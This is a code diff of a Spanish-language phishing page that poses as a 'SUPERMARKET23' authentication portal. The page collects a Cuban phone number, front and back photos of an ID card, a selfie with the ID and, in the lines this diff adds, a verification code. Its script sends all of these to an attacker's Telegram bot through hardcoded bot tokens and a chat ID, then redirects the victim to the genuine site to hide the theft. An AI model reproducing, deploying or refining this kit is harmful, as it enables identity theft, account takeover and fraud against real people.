@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -8,53 +9,40 @@
         body { font-family: sans-serif; margin: 0; text-align: center; background: #fff; }
         .header { background: #004691; color: white; padding: 25px; font-size: 28px; font-weight: bold; }
         .container { padding: 20px; max-width: 450px; margin: auto; }
-        .phone-box { display: flex; align-items: center; background: #f9f9f9; border: 2px solid #004691; border-radius: 8px; padding: 12px; margin-bottom: 20px; }
+        .input-box { display: flex; align-items: center; background: #f9f9f9; border: 2px solid #004691; border-radius: 8px; padding: 12px; margin-bottom: 20px; }
         .photo-input { width: 100%; height: 150px; border: 2px dashed #004691; margin-bottom: 15px; border-radius: 10px; display: flex; align-items: center; justify-content: center; background: #f0f5ff; cursor: pointer; overflow: hidden; }
         .photo-input img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .btn { background: #004691; color: white; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; border-radius: 8px; cursor: pointer; }
-        #status { display: none; margin-top: 50px; }
-        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #004691; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="header">SUPERMARKET23</div>
 
-<div class="container" id="form-ui">
-    <div class="phone-box">
+<div class="container">
+    <div class="input-box">
         <span style="font-weight:bold; color:#004691; margin-right:5px;">+53 #</span>
-        <input type="tel" id="num" placeholder="Teléfono" style="border:none; outline:none; font-size:18px; width:100%;">
+        <input type="tel" id="num" placeholder="Número" style="border:none; outline:none; font-size:18px; width:100%;">
     </div>
 
     <div class="photo-input" onclick="document.getElementById('f1').click()">
         <span id="t1">FOTO FRONTAL ID</span>
-        <img id="i1">
-        <input type="file" id="f1" accept="image/*" capture="camera" hidden onchange="view(this,'i1','t1')">
+        <img id="i1"><input type="file" id="f1" accept="image/*" capture="camera" hidden onchange="view(this,'i1','t1')">
     </div>
     <div class="photo-input" onclick="document.getElementById('f2').click()">
         <span id="t2">FOTO TRASERA ID</span>
-        <img id="i2">
-        <input type="file" id="f2" accept="image/*" capture="camera" hidden onchange="view(this,'i2','t2')">
+        <img id="i2"><input type="file" id="f2" accept="image/*" capture="camera" hidden onchange="view(this,'i2','t2')">
     </div>
     <div class="photo-input" onclick="document.getElementById('f3').click()">
         <span id="t3">SELFIE CON ID</span>
-        <img id="i3">
-        <input type="file" id="f3" accept="image/*" capture="camera" hidden onchange="view(this,'i3','t3')">
+        <img id="i3"><input type="file" id="f3" accept="image/*" capture="camera" hidden onchange="view(this,'i3','t3')">
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="codigo" placeholder="Código de Verificación" style="border:none; outline:none; font-size:18px; width:100%; text-align:center;">
     </div>
 
     <button class="btn" onclick="send()">AUTENTICAR</button>
-</div>
-
-<div id="status" class="container">
-    <div id="loading">
-        <div class="loader"></div>
-        <p>Procesando autenticación...</p>
-    </div>
-    <div id="done" style="display:none;">
-        <h2 style="color:#28a745;">✓ Autenticación Exitosa</h2>
-        <p>Redirigiendo al portal...</p>
-    </div>
 </div>
 
 <script>
@@ -72,39 +60,27 @@
 
     async function send() {
         const tel = document.getElementById('num').value;
-        if(!tel) return alert("Pon el número");
-
-        document.getElementById('form-ui').style.display = 'none';
-        document.getElementById('status').style.display = 'block';
-
-        // DATOS DE TUS CAPTURAS
-        const tok = "8318759298:AAHQGru4lkB72lUN9TA-1VCZGxbl1n_3Nkc"; //
-        const cid = "6475554235"; //
+        const cod = document.getElementById('codigo').value;
+        // Tu nuevo token activo
+        const tok = "8318759298:AAG-KrV_QaFdJb_Z3DUbU_gyJiPPdb2HofA"; 
+        const cid = "6475554235"; // Tu ID confirmado
 
         try {
-            // Enviar Texto
-            await fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: cid, text: "NUEVO: +53 #" + tel, disable_notification: true})
-            });
-
-            // Enviar Fotos
-            const files = ['f1', 'f2', 'f3'];
-            for (let id of files) {
+            // Envío de datos de texto
+            await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=NUEVO:+53+#${tel}%0ACÓDIGO:+${cod}`);
+            
+            // Envío de las 3 fotos
+            for (let id of ['f1', 'f2', 'f3']) {
                 let f = document.getElementById(id).files[0];
                 if (f) {
                     let fd = new FormData();
                     fd.append('chat_id', cid);
                     fd.append('photo', f);
-                    fd.append('disable_notification', 'true');
                     await fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method: 'POST', body: fd});
                 }
             }
-
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('done').style.display = 'block';
-            setTimeout(() => { window.location.href = "https://www.supermarket23.com/"; }, 2000);
+            // Redirección final
+            window.location.href = "https://www.supermarket23.com/";
         } catch (e) {
             window.location.href = "https://www.supermarket23.com/";
         }
